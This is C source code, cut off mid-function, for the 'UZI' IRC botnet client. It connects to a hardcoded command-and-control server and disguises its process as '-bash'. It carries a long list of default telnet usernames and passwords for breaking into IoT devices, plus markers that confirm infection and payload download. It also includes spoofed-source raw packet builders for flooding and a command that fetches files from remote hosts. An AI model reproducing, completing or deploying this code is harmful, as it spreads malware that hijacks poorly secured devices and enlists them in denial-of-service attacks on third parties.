// ~~ The best
#define STARTUP
#undef IDENT
#define FAKENAME "-bash"
#define cnport 9394
#define BOTuser "h4kkr uzi bot written by ZH"
#define BOTident "UZI"
#define CHAN "#"
#define KEY ""
#define PREFIX "[ZS]"
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define SOCKBUF_SIZE 1024
#define MAX_NICK_LENGTH 31
#define NUM_ADMINS 2
#define NUM_THREADS 150
#define PHI 0x9e3779b9
#include <stdarg.h>
#include <pthread.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <strings.h>
#include <netinet/in.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
//#######################
//########UZI############
//#######################
// God bot written by ZH The Lord.

char encodes[] = { 
    '<', '>', '@', '_', ';', ':', ',', '.', '-', '+', '*', '^', '?', '=', ')', '(', 
    '|', 'A', 'B', '&', '%', '$', 'D', '"', '!', 'w', 'k', 'y', 'x', 'z', 'v', 'u', 
    't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'i', 'h', 'g', 'f', 'e', 'd', 'c', 
    'b', 'a', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'F', 'U', 'C', 'K'
};

char decodes[] = { 
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
    'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z', 'y', 
    'w', 'k', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'M', 'N', 'O', 
    'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'K', 'X', '|', ':', '.', ' '
};

char encoded[512], decoded[512];

void encode(char *str) {
    int x = 0, i = 0, c;

    memset(encoded, 0, sizeof(encoded));
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(decodes); c++) {
            if (str[x] == decodes[c]) {
                encoded[i] = encodes[c];
                i++;
            }
        }

        x++;
    }

    encoded[i] = '\0';
    return;
}

void decode(char *str) {
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    
    while (x < strlen(str)) {
        for (c = 0; c <= sizeof(encodes); c++) {
            if (str[x] == encodes[c]) {
                decoded[i] = decodes[c];
                i++;
            }
        }

        x++;
    }

    decoded[i] = '\0';
    return;
}
int numservers=1;
int *maxtime=3600;
char *servers[] = {
        "lol.r00ts.ninja",
        (void*)0
};

int *maxSTDpacketsize=4096;
char *strng;
char *strng2;
int *setpacketsize;
int *maxthreads=2048;
int *threadamount;


char admins[NUM_ADMINS][MAX_NICK_LENGTH] = {"ZoneHax", "ZH"};



const char *UserAgents[] = {
      "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/",
      "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
      "zspider/0.9-dev http://feedback.redkolibri.com/",
      "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
      "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
      "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
      "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
      "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
      "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
      "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",

      "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
      "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",
      "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",
      "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",
      "Mozilla/5.0 (compatible; mxbot/1.0;  http://www.chainn.com/mxbot.html)",
      "NetResearchServer/4.0(loopimprovements.com/robot.html)",
      "NetResearchServer/3.5(loopimprovements.com/robot.html)",
      "NetResearchServer/2.8(loopimprovements.com/robot.html)",
      "NetResearchServer/2.7(loopimprovements.com/robot.html)",
      "NetResearchServer/2.5(loopimprovements.com/robot.html)",
      "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",
      "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
      "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",
      "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
      "Opera/9.20 (Windows NT 6.0; U; en)",
      "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
      "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",
      "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
      "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
      "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
      "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
      "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
      "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
      "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
      "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0",
    "MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1"
};
char *getBuild() { //detect nearly every architecture. Coded by ZoneHax
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__)
    return "ARM2";
    #elif defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__)
    return "ARM3";
    #elif defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM4T";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_)
    return "ARM6T2";
    #elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)
    return "ARM6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM7";
    #elif defined(__aarch64__)
    return "ARM64";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
    #elif defined(__sh__)
    return "SUPERH";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "POWERPC";
    #elif defined(__sparc__) || defined(__sparc)
    return "SPARC";
    #elif defined(__m68k__)
    return "M68K";
    #else
    return "UNKNOWN";
    #endif
}
char *uziusernames[] = {
    "telnet\0", "root\0","root\0","admin\0","admin\0","user\0","login\0", 
    "guest\0", "support\0","root\0","root\0","CISCO\0","oracle\0","tim\0", 
    "root\0","root\0","root\0","root\0","root\0","root\0","root\0","root\0", 
    "support\0","root\0","admin\0","root\0","user\0","admin\0","root\0",
    "admin\0","root\0","admin\0","admin\0","root\0","root\0","root\0",
    "root\0","Administrator\0","service\0","supervisor\0","guest\0", 
    "guest\0","guest\0","admin1\0","administrator\0","666666\0", 
    "888888\0","ubnt\0","klv1234\0","Zte521\0","hi3518\0",
    "jvbzd\0","anko\0","zlxx\0","7ujMko0vizxv\0","7ujMko0admin\0",
    "system\0","ikwb\0","dreambox\0","user\0","realtek\0", 
    "00000000\0", "1111111\0","1234\0","12345\0", 
    "54321\0","123456\0","7ujMko0admin\0",
    "1234\0", "pass\0", "meinsm\0", "tech\0",  "fucker\0", 
};
char *uzipasswords[] = {
    "telnet\0","root\0","admin\0","admin\0","toor\0","admin\0", 
    "user\0","guest\0","login\0","changeme\0","1234\0","12345\0",
    "123456\0","default\0","pass\0","password\0","support\0","\0", 
    "maxided\0","oracle\0","tim\0","xc3511\0","vizxv\0","888888\0", 
    "xmhdipc\0","default\0","juantech\0","123456\0","54321\0","support\0", 
    "\0","password\0","12345\0","user\0","\0","pass\0","admin1234\0","1111\0", 
    "smcadmin\0","1111\0","666666\0","password\0","1234\0","klv123\0","admin\0", 
    "service\0","supervisor\0","guest\0","12345\0","password\0","1234\0",
    "666666\0","888888\0","ubnt\0","klv1234\0","Zte521\0","hi3518\0", 
    "jvbzd\0","anko\0","zlxx\0","7ujMko0vizxv\0","7ujMko0admin\0", 
    "system\0","ikwb\0","dreambox\0","user\0","realtek\0","00000000\0", 
    "1111111\0","1234\0","12345\0","54321\0","123456\0","7ujMko0admin\0", 
    "1234\0","pass\0","meinsm\0","tech\0","fucker\0",
};

int scanPid = 0;

char *advances[] = {":", "user", "ogin", "name", "pass", "dvrdvs", "assword:", (char*)0};                                                                                     
char *fails[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", (char*)0};                                                         
char *successes[] = {"busybox", "$", "#", "shell", "dvrdvs", (char*)0};                                                                                                     
char *advances2[] = {"nvalid", "ailed", "ncorrect", "enied", "rror", "oodbye", "bad", "busybox", "$", "#", (char*)0};
char *infectconfirm = "UZI";
char *downloadingbin = {"ownloading", "onnecting to", "% |", "ETA", (char*)0}; // checks if wget is grabbing file.

struct telstate_t {
        int fd;
        unsigned int ip;
        unsigned char state;
        unsigned char complete;
        unsigned char usernameInd;     /* username     */
        unsigned char passwordInd;     /* password     */
        unsigned char tempDirInd;     /* tempdir         */
        unsigned int tTimeout;        /* totalTimeout */
        unsigned short bufUsed;
        char *sockbuf;
};

struct thread_args{
	int iSTD_Sock;
	struct sockaddr_in *sin; 
};

int sock,changeservers=0;
char *server, *chan, *key, *nick, *ident, *user, disabled=0, execfile[256],dispass[256];
unsigned int *pids, actualparent;
unsigned long spoofs=0, spoofsm=0, numpids=0;
static uint32_t Q[4096], c = 362436;
struct in_addr ourIP;
unsigned char macAddress[6] = {0};
int strwildmatch(const char* pattern, const char* string) {
	switch(*pattern) {
		case '\0': return *string;
		case '*': return !(!strwildmatch(pattern+1, string) || *string && !strwildmatch(pattern, string+1));
		case '?': return !(*string && !strwildmatch(pattern+1, string+1));
		default: return !((toupper(*pattern) == toupper(*string)) && !strwildmatch(pattern+1, string+1));
	}
}

uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
int sclose(int fd) {
        if(3 > fd) return 1;
        close(fd);
        return 0;
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int got = 1, total = 0;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got == 0 ? NULL : buffer;
}
int getOurIP()
{
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        if(sock == -1) return 0;

        struct sockaddr_in serv;
        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr("8.8.8.8");
        serv.sin_port = htons(53);

        int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
        if(err == -1) return 0;

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        err = getsockname(sock, (struct sockaddr*) &name, &namelen);
        if(err == -1) return 0;

        ourIP.s_addr = name.sin_addr.s_addr;

        int cmdline = open("/proc/net/route", O_RDONLY);
        char linebuf[4096];
        while(fdgets(linebuf, 4096, cmdline) != NULL)
        {
                if(strstr(linebuf, "\t00000000\t") != NULL)
                {
                        unsigned char *pos = linebuf;
                        while(*pos != '\t') pos++;
                        *pos = 0;
                        break;
                }
                memset(linebuf, 0, 4096);
        }
        close(cmdline);

        if(*linebuf)
        {
                int i;
                struct ifreq ifr;
                strcpy(ifr.ifr_name, linebuf);
                ioctl(sock, SIOCGIFHWADDR, &ifr);
                for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
        }

        close(sock);
}
int realrand(int low, int high) {
  srand(time(NULL) + getpid());
  return (rand() % (high + 1 - low) + low);
}
void makeRandomShit(unsigned char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for(i = 0; i < length; i++) buf[i] = rand();
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int Send(int sock, char *words, ...) {
        static char textBuffer[1024];
        va_list args;
        va_start(args, words);
        vsprintf(textBuffer, words, args);
        va_end(args);
        return write(sock,textBuffer,strlen(textBuffer));
}
int mfork(char *sender) {
	unsigned int parent, *newpids, i;
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return 1;
	}
	parent=fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));
	for (i=0;i<numpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
unsigned long getspoof() {
	if (!spoofs) return rand();
	if (spoofsm == 1) return ntohl(spoofs);
	return ntohl(spoofs+(rand() % spoofsm)+1);
}

void filter(char *a) { while(a[strlen(a)-1] == '\r' || a[strlen(a)-1] == '\n') a[strlen(a)-1]=0; }
char *makestring() {
	char *tmp;
	int len=(rand()%5)+4,i;
 	FILE *file;
	tmp=(char*)malloc(len+1);
 	memset(tmp,0,len+1);
 	if ((file=fopen("/usr/dict/words","r")) == NULL) for (i=0;i<len;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()*rand())%45402)+1;
		char buf[1024];
		for (i=0;i<a;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
		fclose(file);
	}
	return tmp;
}
void identd() {
        int sockname,sockfd,sin_size,tmpsock,i;
        struct sockaddr_in my_addr,their_addr;
        char szBuffer[1024];
        if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) return;
        my_addr.sin_family = AF_INET;
        my_addr.sin_port = htons(113);
        my_addr.sin_addr.s_addr = INADDR_ANY;
        memset(&(my_addr.sin_zero), 0, 8);
        if (bind(sockfd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1) return;
        if (listen(sockfd, 1) == -1) return;
        if (fork() == 0) return;
        sin_size = sizeof(struct sockaddr_in);
        if ((tmpsock = accept(sockfd, (struct sockaddr *)&their_addr, &sin_size)) == -1) exit(0);
        for(;;) {
                fd_set bla;
                struct timeval timee;
                FD_ZERO(&bla);
                FD_SET(tmpsock,&bla);
                timee.tv_sec=timee.tv_usec=60;
                if (select(tmpsock + 1,&bla,(fd_set*)0,(fd_set*)0,&timee) < 0) exit(0);
                if (FD_ISSET(tmpsock,&bla)) break;
        }
        i = recv(tmpsock,szBuffer,1024,0);
        if (i <= 0 || i >= 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == '\n' || szBuffer[i-1] == '\r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == '\n' || szBuffer[i-2] == '\r') szBuffer[i-2]=0;
	Send(tmpsock,"%s : USERID : UNIX : %s\n",szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
long pow(long a, long b) {
        if (b == 0) return 1;
        if (b == 1) return a;
        return a*pow(a,b-1);
}
u_short in_cksum(u_short *addr, int len) {
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer =0;
        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}
void get(int sock, char *sender, int argc, char **argv) {
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :GET <host> <save as>\n",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
                exit(0);
        }
        if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
                exit(0);
        }

        Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock,"NOTICE %s :Receiving file.\n",sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,"NOTICE %s :Saved as %s\n",sender,argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
        exit(0);
}
void getspoofs(int sock, char *sender, int argc, char **argv) {
        unsigned long a=spoofs,b=spoofs+(spoofsm-1);
        if (spoofsm == 1) Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0]);
        else Send(sock,"NOTICE %s :Spoofs: %d.%d.%d.%d - %d.%d.%d.%d\n",sender,((u_char*)&a)[3],((u_char*)&a)[2],((u_char*)&a)[1],((u_char*)&a)[0],((u_char*)&b)[3],((u_char*)&b)[2],((u_char*)&b)[1],((u_char*)&b)[0]);
}
void version(int sock, char *sender, int argc, char **argv) {
        Send(sock,"NOTICE %s : Version 2\n",sender);
}
void nickc(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :7NICK <nick>\n",sender);
                return;
        }
        if (strlen(argv[1]) >= 10) {
                Send(sock,"NOTICE %s :7Nick cannot be larger than 9 characters.\n",sender);
                return;
        }
        Send(sock,"NICK %s\n",argv[1]);
}
void disable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :7DISABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :7Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (disabled) {
		Send(sock,"NOTICE %s :7Already disabled.\n",sender);
		return;
	}
	if (strlen(argv[1]) > 254) {
                Send(sock,"NOTICE %s :7Password too long! > 254\n",sender);
                return;
	}
        disabled=1;
	memset(dispass,0,256);
	strcpy(dispass,argv[1]);
	Send(sock,"NOTICE %s :7Disable successful.\n");
}
void enable(int sock, char *sender, int argc, char **argv) {
        if (argc != 1) {
                Send(sock,"NOTICE %s :7ENABLE <pass>\n",sender);
                Send(sock,"NOTICE %s :7Current status is: %s.\n",sender,disabled?"Disabled":"Enabled and awaiting orders");
                return;
        }
	if (!disabled) {
		Send(sock,"NOTICE %s :7Already enabled.\n",sender);
		return;
	}
	if (strcasecmp(dispass,argv[1])) {
		Send(sock,"NOTICE %s :7Wrong password\n",sender);
		return;
	}
        disabled=0;
	Send(sock,"NOTICE %s :7Password correct.\n",sender);
}
void spoof(int sock, char *sender, int argc, char **argv) {
        char ip[256];
        int i, num;
        unsigned long uip;
        if (argc != 1) {
                Send(sock,"NOTICE %s :7Removed all spoofs\n",sender);
                spoofs=0;
                spoofsm=0;
                return;
        }
        if (strlen(argv[1]) > 16) {
                Send(sock,"NOTICE %s :7What kind of subnet address is that? Do something like: 169.40\n",sender);
                return;
        }
        strcpy(ip,argv[1]);
        if (ip[strlen(ip)-1] == '.') ip[strlen(ip)-1] = 0;
        for (i=0, num=1;i<strlen(ip);i++) if (ip[i] == '.') num++;
        num=-(num-4);
        for (i=0;i<num;i++) strcat(ip,".0");
        if (num == 0) spoofsm=1;
        else spoofsm=pow(256,num);
        spoofs=uip;
}
struct udphdr {
        unsigned short source;
        unsigned short dest;
        unsigned short len;
        unsigned short check;
};
struct send_tcp {
	struct iphdr ip;
	struct tcphdr tcp;
	char buf[20];
};
struct pseudo_header {
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char pVageholder;
	unsigned char protocol;
	unsigned short tcp_length;
	struct tcphdr tcp;
	char buf[20];
};
unsigned int host2ip(char *sender,char *hostname) {
        static struct in_addr i;
        struct hostent *h;
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, "NOTICE %s :Unable to resolve %s\n", sender,hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
        }
        return i.s_addr;
}
in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}
int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}
static void printchar(unsigned char **str, int c) {
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}
static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
        register int pc = 0, padchar = ' ';
        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }
        return pc;
}
static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;
        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }
        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';
        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }
        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}
static int print(unsigned char **out, const unsigned char *format, va_list args ) {
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];
        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad);
                                continue;
                        }
                        if( *format == 'd' ) {
